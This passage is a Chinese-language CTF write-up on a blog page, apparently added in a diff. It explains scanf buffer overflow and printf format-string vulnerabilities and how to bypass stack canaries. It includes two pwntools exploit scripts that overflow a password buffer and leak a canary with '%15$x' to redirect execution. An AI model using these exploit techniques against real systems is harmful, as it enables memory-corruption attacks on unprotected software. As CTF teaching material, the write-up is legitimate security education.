+<li>例如：<code>printf(&quot;Hello %s&quot;, &quot;world&quot;)</code>将会把<code>%s</code>填充为后面加上的word；</li>
+<li>格式化说明符存在许多种不同的数据类型，可以利用不同的类型规定格式化字符串接受哪种类型的数据。</li>
+<li>常用的类型包括：<ul>
+<li>%d – 十进制 – 输出十进制整数</li>
+<li>%s – 字符串 – 从内存中读取字符串 </li>
+<li>%x – 十六进制 – 输出十六进制数</li>
+<li>%c – 字符 – 输出字符</li>
+<li>%p – 指针 – 指针地址</li>
+<li>%n – 到目前为止所写的字符数</li>
+</ul>
+</li>
+<li>可能存在格式化字符串漏洞函数 – fprintf，printf，sprint，snprintf，scanf 等等</li>
+<li>举个例子说明一下</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fze8cro6xaj30e408q0vk.jpg" alt=""></p>
+<ul>
+<li>这段代码将接受的字符串作为参数，创建一个1024字符缓冲区，接着将字符串复制到缓冲区，最后调用两个printf函数格式化输出。</li>
+<li><strong>printf</strong>的格式化字符串漏洞更多使用来定位我们需要的函数返回地址，当程序做了一些保护，例如动态加载敏感函数，而我们没有办法获取到该函数的返回地址的时候我们就可以用printf的格式化字符串来获取当前程序中执行的某个函数或者变量或者缓冲区的地址了；</li>
+<li>而其他的例如scanf的漏洞大多还是直接利用没有边界导致读取过多字符的漏洞来进行利用；</li>
+</ul>
+<h3 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析"></a>题目解析</h3><ul>
+<li>通过nc先连接地址进行测试，会让我们输入一个密码，随便输入一个提示错误；</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fze8nn10q4j30gy02wmxg.jpg" alt=""></p>
+<ul>
+<li>通过ida来逆向程序，非常简单的在一个strcmp函数中找到了密码比对的字符，也就是正确的密码。</li>
+</ul>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fze8q2kvg7j30gy04wtbb.jpg" alt=""></p>
+<ul>
+<li>接下来我们通过这个密码登录后，选择一个编号后会输出对应的文件</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fze8sf6oxdj30v20l6jt7.jpg" alt=""></p>
+<ul>
+<li>选择一个编号后会通过一个switch结构找到对应文件，并用<code>print_record</code>进行输出；</li>
+<li>文件名我们查询后是一个md5 加上.dat后缀名；</li>
+<li>而record函数中则会检测文件名的长度，要求必须是36位的长度（md5的32位加上4位后缀名）</li>
+</ul>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fze9hmj832j30fm0dq0uo.jpg" alt=""></p>
+<p><img src="/Users/sy/Library/Application Support/typora-user-images/image-20190121155922729.png" alt="image-20190121155922729"></p>
+<p><img src="/Users/sy/Library/Application Support/typora-user-images/image-20190121155956539.png" alt="image-20190121155956539"></p>
+<ul>
+<li>以上是题目的逻辑，那么该如何利用呢，也就是flag在哪呢，看到最后一个<code>switch</code>，它的<code>v8</code>是<code>flag.txt</code>但是如果不够长也就是<code>v9</code>为0的话总是会提示我们没有权限；</li>
+</ul>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fze9q1f8dpj30pm03mdgb.jpg" alt=""></p>
+<ul>
+<li><p>那么现在有一个思路，就是让文件名长到超过v8的存储范围覆盖到v9或者利用别的循环，将文件名填充为flag.txt。但是无论如何我么肯定需要利用某一块的漏洞进行溢出覆盖了。</p>
+</li>
+<li><p>题目一共接收了两次我们的输入，都是利用scanf格式接受。第一次是在输入密码的时候，第二次是在输入编号的时候；</p>
+</li>
+</ul>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fze9v2hvx4j30jc0bkgo8.jpg" alt=""></p>
+<ul>
+<li>通常我们选择靠近要覆盖地址的区域进行溢出，但是我们看到其中的格式，%s为接受字符串，但是%d只能接受数字，也就是说我们只能利用接受密码的变量<code>s1</code>了。</li>
+<li>那么接下来计算地址，我们要覆盖的变量为：v8，而利用参数为s1，看看他们内存中的存储地址：</li>
+</ul>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzea41xjitj30cm046aap.jpg" alt=""></p>
+<ul>
+<li>s1为：-40~+10的位置</li>
+<li><p>V8为：-30~+20的位置</p>
+</li>
+<li><p>但这只是静态程序中的定义，我们不知道运行之后两个变量对应的堆栈也就是相对的<code>ebp</code>是否相邻，于是利用gdb进行动态调试后查看两个变量的位置；</p>
+</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzea6jc7bkj30ko05qn3f.jpg" alt=""></p>
+<ul>
+<li><p>我们看到，他们的确相差0x10个字符，也就是16个字符；</p>
+</li>
+<li><p>接下来进行溢出计算，首先密码是必须的，也就是s1必须填充<code>kaiokenx20</code>这10个字符，所以我们想准确的覆盖v8还需要填充6个字符；</p>
+</li>
+<li>在覆盖v8的时候要记住，有文件名长度检查，也就是长度要符合36，但是flag并没有md5加密文件名，我们从第6个提示能看出来；</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzeagm2ufbj30v407odga.jpg" alt=""></p>
+<ul>
+<li>所以利用14个<code>./</code>来填充 + Flag.txt</li>
+</ul>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'39.107.92.230'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Enter password to authentic yourself : '</span>)</span><br><span class="line">r.sendline(<span class="string">'kaiokenx20'</span>+<span class="string">'A'</span>*<span class="number">6</span>+<span class="number">14</span>*<span class="string">'./'</span> + <span class="string">"flag.txt"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(<span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="背景三"><a href="#背景三" class="headerlink" title="背景三"></a>背景三</h2><p><code>binary_200</code>知识点：格式化字符串漏洞，canary保护</p>
+<h3 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><ul>
+<li>接着上一道题，一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变模糊了。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求出入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会严格的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</li>
+<li>示例程序：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>假设输入为：<code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code>，发现输出的第7个数为41414141发现刚好是AAAA的ascii码，这也是我们输入的字符串开始的位置。</li>
+</ul>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzejqy812vj30pa02cdja.jpg" alt=""></p>
+<ul>
+<li>堆栈中的数据也是这样子存储的。</li>
+</ul>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzeju2qb9aj30ke0aith5.jpg" alt=""></p>
+<ul>
+<li>Printf格式化字符串有另一个特性，<code>$</code>操作符，这个操作符可以输出指定位置的参数，而不需要多长输入格式标志了，这样我们直接输出了第6个位置的内存值；</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzejx3f12bj30i60bstdf.jpg" alt=""></p>
+<ul>
+<li>但是这里如果直接使用脚本来利用是有问题的。我们利用脚本来攻击这个程序</li>
+</ul>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzek01nu3wj30fw05uaei.jpg" alt=""></p>
+<ul>
+<li>当偏移为6的时候报了EOF的错</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzek1c3x0wj30l601yab3.jpg" alt=""></p>
+<ul>
+<li>我们想要读取的地址为0x08048000，因为是小端存储，我们发送的数据包第一个字节是地址最后一个字节也就是0x00所以发送失败了，所以需要增加一个偏移示意如下：</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzek49ar5mj30ys0ci10f.jpg" alt=""></p>
+<ul>
+<li>成功读取地址</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzek6pgidxj30l605e42z.jpg" alt=""></p>
+<h3 id="Canary保护"><a href="#Canary保护" class="headerlink" title="Canary保护"></a>Canary保护</h3><ul>
+<li>Canary是放置栈溢出的一种保护机制，从FS块内存的某个区域获取一个值存在栈中，类似于Cookie。当程序执行返回的时候，会对这个值进行校验，如果该值正确，程序正常执行返回，否则程序被判定为发生栈溢出，直接退出。</li>
+<li>为了防止发生信息泄露以及其他漏洞的利用，Canary使用\x00对值进行截断，所以Canary的最低byte位为<code>\x00</code>；</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzeix28dg6j30c2084myh.jpg" alt=""></p>
+<ul>
+<li>我们可以把padding部分全部覆盖掉，然后按byte覆盖Canary的值。如果程序正常运行，则该byte的Canary值正确；若程序退出，则继续爆破该位Canary的值。或者如果有格式化字符串则可以读取这个值了。</li>
+</ul>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzej30g8s7j30eg0he0z0.jpg" alt=""></p>
+<h3 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析"></a>题目解析</h3><ul>
+<li>首先根据题目提示，看到了程序打开了保护，所以放到gdb中用checksec观察发现开启了CANNARY保护，那么也就需要找到canary的偏移位置了。</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzedypushvj30ei07ajw0.jpg" alt=""></p>
+<ul>
+<li>在有printf格式化字符串的漏洞不需要去暴力破解canary，所以我们可以通过gdb找到格式化字符串与输入值的偏移。</li>
+<li>我们在printf上下断点（这时候能够看到我们输入的字符串在堆栈中的位置）</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzee1uklrsj30g006atcs.jpg" alt=""></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzee27srmvj30mk02e778.jpg" alt=""></p>
+<ul>
+<li>接着运行函数，并输入一个简单值例如<code>aaaa</code>，并看到<code>aaaa</code>在堆栈的<code>0xffffd020</code>存入；</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzee32e3y6j30ha068451.jpg" alt=""></p>
+<ul>
+<li>接着我们看到了最后canary保护方式为：利用dex中获取的<code>esp+3c</code>的值与<code>large gs:14h</code>进行比较不相等则退出。那么我们就可以取出当前内存中的值（canary已经入栈）</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzee6awlo3j30ou052tcn.jpg" alt=""></p>
+<ul>
+<li><strong>x/20wx   0xffffd020</strong></li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzee6y2fzij30ko042jwd.jpg" alt=""></p>
+<ul>
+<li>接着重新下断点，我们去到最终比较的值（赋值给edx那里）获取这次canary的值找到edx中canary的值为：<code>0x93226e00</code>；</li>
+<li>他们之间相差15个参数的长度，所以可以通过格式化字符串：<code>%15$x</code>获取这个值；</li>
+</ul>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'172.104.78.53'</span>, <span class="number">22002</span>)</span><br><span class="line"></span><br><span class="line">func = <span class="number">0x0804854d</span></span><br><span class="line">r.sendline(<span class="string">'%15$x'</span>)</span><br><span class="line">canary = int(r.recv(), <span class="number">16</span>) <span class="comment">#获取需要的canary的值</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">40</span> + p32(canary) + <span class="string">'B'</span>*<span class="number">12</span> + p32(func)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这简单的三道题，成功复习了缓冲区溢出和格式化字符串漏洞的相关知识，以及如何绕过缓冲区保护机制之一的（Canary机制）。</p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/pwn/">pwn</a> <a class="tag tag--primary tag--small t-link" href="/tags/pwntools/">pwntools</a> <a class="tag tag--primary tag--small t-link" href="/tags/rop/">rop</a>
+
+            </div>
+        
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 Yuan Shen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+            <h4 id="about-card-name">Yuan Shen</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-vufjrm3fmbuttogo1hxuu0w9w0sesk5iyysjuguc2hdhufot9szxg8twijry.min.js"></script>
+<!--SCRIPTS END-->
+
+
+
+    </body>
+</html>
